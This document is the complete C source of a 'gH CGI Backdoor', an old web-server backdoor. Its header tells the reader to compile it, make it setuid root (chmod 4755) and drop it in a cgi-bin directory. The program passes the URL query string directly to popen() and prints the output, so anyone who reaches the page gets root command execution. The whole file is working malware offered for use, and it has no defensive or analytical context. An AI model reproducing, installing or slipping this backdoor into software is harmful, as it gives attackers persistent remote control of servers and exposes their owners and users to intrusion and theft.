/*
 * gH CGI Backdoor 1.0
 *
 * Install:
 * -------------------------------
 *   % gcc -o gH.cgi gH-cgi.c
 *   % chown root.root gH.cgi
 *   % chmod 4755 gH.cgi
 * -------------------------------
 * Tested with apache 1.3.4
 *
 * Note: place gH.cgi in a cgi-bin directory
 *
 *      blasphemy (cornoil@netscape.net)
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define	TITLE	"gH CGI Backdoor"

char x2c(char *what);
int header();
int footer();

int
main() {
   FILE *out;
   char *qs = (char *)malloc(256);
   int x = 0, i = 0, c = 0, f = 0;
	qs = getenv("QUERY_STRING");
	if (qs != NULL) {
		for (x = 0, i = 0; qs[i]; x++, i++) {
			if ((qs[x] = qs[i]) == '%') {
				qs[x] = x2c(&qs[i + 1]);
				i += 2;
			  }
		  }
		qs[x] = '\0';
		for (x = 0; qs[x]; x++) {
			if (qs[x] == '+') {
				qs[x] = ' ';
			  }
		  }
		header(qs);
		out = popen(qs, "r");
		if (out != NULL) {
			while (c != EOF) {
				c = fgetc(out);
				if (c != EOF && c != '\0') {
					printf("%c", (char) c);
					f++;
				  }
			  }
			pclose(out);
		}
		if (f == 0 && strcmp(qs, "") != 0)
			printf("gH: %s: command not found\n", qs);
	}
	footer();
   return(0);
}

char x2c(char *what)
{
  register char digit;
          
  digit = (what[0] >= 'A' ? ((what[0] & 0xdf) - 'A')+10 : (what[0] - '0'));
  digit *= 16;
  digit += (what[1] >= 'A' ? ((what[1] & 0xdf) - 'A')+10 : (what[1] - '0'));
  return (digit);
}

int
header(char *qs) {
	printf("Content-type: text/html\n\n");
	printf("<html>\n<head><title>%s</title></head>\n", TITLE);
	printf("<body bgcolor=\"#ffffff\">\n");
	printf("<dir><h1>%s</h1>\n", TITLE);
        printf("<ISINDEX prompt=\"Command to Execute: \">\n");
	printf("<br><b>Command output:</b> [<em>%s</em>]\n", qs);
        printf("<br><pre>\n");
}

int
footer() {
	printf("</pre>\n</dir>\n</body></html>\n");
}
